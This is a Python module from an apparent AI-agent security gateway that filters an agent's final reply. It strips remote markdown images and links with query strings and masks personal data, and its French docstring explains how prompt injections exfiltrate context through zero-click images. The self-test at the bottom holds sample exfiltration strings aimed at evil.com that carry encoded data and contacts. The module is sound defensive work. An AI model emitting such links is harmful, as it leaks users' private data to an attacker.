"""
Aegis — controle de sortie (egress), le 4e point de controle.

Aegis inspectait tout ce qui ENTRE dans le contexte (firewall, redaction)
et tout ce que l'agent FAIT (policy). Ce module inspecte ce qui SORT :
la reponse finale rendue a l'utilisateur.

Pourquoi : si une injection survit au firewall (paraphrase, langue rare),
son canal d'exfiltration naturel est la reponse finale — typiquement une
image markdown chargee automatiquement (zero-clic) ou un lien dont la
query string transporte les donnees. On coupe le canal, pas l'intention.

v1 assumee, deterministe :
  - les images markdown distantes sont supprimees (auto-chargement = exfil
    zero-clic) ;
  - les URLs qui transportent une query string sont supprimees (le canal
    d'exfiltration classique) — les URLs simples restent ;
  - les PII restantes sont masquees (le modele peut en produire de
    memoire, pas seulement en recopier).

Mode strict (block_all_urls=True, ou AEGIS_EGRESS_STRICT=1) : TOUTE URL est
supprimee, y compris sans query string. Pour un assistant interne de banque,
aucun lien ne devrait sortir : un lien de phishing sans parametre
(https://faux-support.example/login) passait le mode par defaut.
"""

import os

import re
from dataclasses import dataclass, field

from aegis.gateway.redact import redact

# Image markdown pointant vers l'exterieur : chargee sans clic par tout
# renderer markdown -> canal d'exfiltration zero-clic. Supprimee.
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*https?://[^)]*\)")

# URL (markdown ou brute) portant une query string : `?cle=valeur` peut
# encoder n'importe quelle donnee du contexte. Supprimee.
_MD_LINK_WITH_QUERY = re.compile(r"\[[^\]]*\]\(\s*https?://[^)?]*\?[^)]*\)")
_RAW_URL_WITH_QUERY = re.compile(r"https?://[^\s)\]]+\?[^\s)\]]+")

# Mode strict : toute URL (markdown ou brute, avec ou sans query string).
_MD_LINK_ANY = re.compile(r"\[[^\]]*\]\(\s*https?://[^)]*\)")
_RAW_URL_ANY = re.compile(r"(?:https?://|www\.)[^\s)\]]+")


def _strict_default() -> bool:
    return os.environ.get("AEGIS_EGRESS_STRICT", "").lower() in {"1", "true", "yes"}


@dataclass
class EgressResult:
    text: str
    images_removed: int = 0
    links_removed: int = 0
    pii_redacted: int = 0
    pii_counts: dict = field(default_factory=dict)

    @property
    def clean(self) -> bool:
        return not (self.images_removed or self.links_removed or self.pii_redacted)

    @property
    def summary(self) -> str:
        if self.clean:
            return "ok"
        parts = []
        if self.images_removed:
            parts.append(f"{self.images_removed} image(s) distante(s) supprimee(s)")
        if self.links_removed:
            parts.append(f"{self.links_removed} URL(s) a query string supprimee(s)")
        if self.pii_redacted:
            parts.append(f"{self.pii_redacted} PII masquee(s)")
        return "sortie assainie: " + ", ".join(parts)


def screen(text: str, block_all_urls: bool | None = None) -> EgressResult:
    """Assainit la reponse finale avant qu'elle ne quitte l'agent.

    block_all_urls=None -> suit AEGIS_EGRESS_STRICT (defaut : False)."""
    if block_all_urls is None:
        block_all_urls = _strict_default()
    text, images = _MD_IMAGE.subn("[image removed by Aegis]", text)
    if block_all_urls:
        text, links_md = _MD_LINK_ANY.subn("[link removed by Aegis]", text)
        text, links_raw = _RAW_URL_ANY.subn("[link removed by Aegis]", text)
    else:
        text, links_md = _MD_LINK_WITH_QUERY.subn("[link removed by Aegis]", text)
        text, links_raw = _RAW_URL_WITH_QUERY.subn("[link removed by Aegis]", text)

    redaction = redact(text)
    return EgressResult(
        text=redaction.text,
        images_removed=images,
        links_removed=links_md + links_raw,
        pii_redacted=redaction.total,
        pii_counts=redaction.counts,
    )


if __name__ == "__main__":
    # Preuve autonome, aucun LLM requis : python -m aegis.gateway.egress
    samples = [
        "Summary: the meeting notes list three action items for Q2.",
        "Here is the summary. ![status](https://evil.com/px.png?d=c2VjcmV0)",
        "Details: [see the doc](https://evil.com/x?exfil=contacts) "
        "and contact sarah.lopez@acme.com.",
        "More info at https://docs.python.org/3/library/re.html (no query).",
    ]
    for s in samples:
        r = screen(s)
        flag = "CLEAN" if r.clean else "FIXED"
        print(f"[{flag}] {r.summary}\n        -> {r.text}")
